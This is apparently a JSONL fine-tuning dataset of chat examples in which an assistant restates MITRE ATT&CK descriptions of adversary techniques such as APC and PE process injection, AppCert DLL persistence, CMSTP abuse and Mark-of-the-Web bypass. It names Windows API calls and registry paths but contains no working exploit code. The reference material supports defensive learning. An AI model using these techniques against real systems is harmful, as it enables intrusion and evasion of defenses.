{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'File and Directory Discovery' and with the Id: T1083 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'File and Directory Discovery' and with the Id: T1083 is described as follows: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)Some files and directories may require elevated or specific user permissions to access.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dynamic Resolution' and with the Id: T1568 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dynamic Resolution' and with the Id: T1568 is described as follows: Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Masquerade Task or Service' and with the Id: T1036.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Masquerade Task or Service' and with the Id: T1036.004 is described as follows: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Asynchronous Procedure Call' and with the Id: T1055.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Asynchronous Procedure Call' and with the Id: T1055.004 is described as follows: Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Traffic Duplication' and with the Id: T1020.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Traffic Duplication' and with the Id: T1020.001 is described as follows: Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.. The systems targeted by this attack pattern are: Network, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Shimming' and with the Id: T1138 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Shimming' and with the Id: T1138 is described as follows: The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179) to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>Custom databases are stored in:* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to [Hooking](https://attack.mitre.org/techniques/T1179), utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Plist File Modification' and with the Id: T1647 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Plist File Modification' and with the Id: T1647 is described as follows: Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).For example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application\u2019s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'AppCert DLLs' and with the Id: T1546.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'AppCert DLLs' and with the Id: T1546.009 is described as follows: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'CMSTP' and with the Id: T1191 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'CMSTP' and with the Id: T1191 is described as follows: The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Multi-hop Proxy' and with the Id: T1188 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Multi-hop Proxy' and with the Id: T1188 is described as follows: To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Email Forwarding Rule' and with the Id: T1114.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Email Forwarding Rule' and with the Id: T1114.003 is described as follows: Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. . The systems targeted by this attack pattern are: Office 365, Windows, Google Workspace, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Staged' and with the Id: T1074 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Staged' and with the Id: T1074 is described as follows: Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.. The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Steal or Forge Authentication Certificates' and with the Id: T1649 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Steal or Forge Authentication Certificates' and with the Id: T1649 is described as follows: Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate\u2019s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate\u2019s subject alternative name (SAN) values define the certificate owner\u2019s alternate names.(Citation: Medium Certified Pre Owned)Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as \u201cgolden\u201d certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned). The systems targeted by this attack pattern are: Windows, Linux, macOS, Azure AD ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Device Registration' and with the Id: T1098.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Device Registration' and with the Id: T1098.005 is described as follows: Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)Similarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) Devices registered in Azure AD may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Azure AD tenant by registering a large number of devices.(Citation: AADInternals - BPRT). The systems targeted by this attack pattern are: Azure AD, Windows, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Network Connections Discovery' and with the Id: T1049 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Network Connections Discovery' and with the Id: T1049 is described as follows: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A). The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Infrastructure' and with the Id: T1584 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Infrastructure' and with the Id: T1584 is described as follows: Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Additionally, adversaries may also compromise infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking)By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Mark-of-the-Web Bypass' and with the Id: T1553.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Mark-of-the-Web Bypass' and with the Id: T1553.005 is described as follows: Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disable Crypto Hardware' and with the Id: T1600.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disable Crypto Hardware' and with the Id: T1600.002 is described as follows: Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks). The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Pre-OS Boot' and with the Id: T1542 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Pre-OS Boot' and with the Id: T1542 is described as follows: Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.. The systems targeted by this attack pattern are: Linux, Windows, Network, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Scripting' and with the Id: T1064 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Scripting' and with the Id: T1064 is described as follows: **This technique has been deprecated. Please use [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) where appropriate.**Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Build Image on Host' and with the Id: T1612 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Build Image on Host' and with the Id: T1612 is described as follows: Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)An adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it\u2019s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. . The systems targeted by this attack pattern are: Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Shared Webroot' and with the Id: T1051 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Shared Webroot' and with the Id: T1051 is described as follows: **This technique has been deprecated and should no longer be used.**Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Portable Executable Injection' and with the Id: T1055.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Portable Executable Injection' and with the Id: T1055.002 is described as follows: Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Windows ."}]}
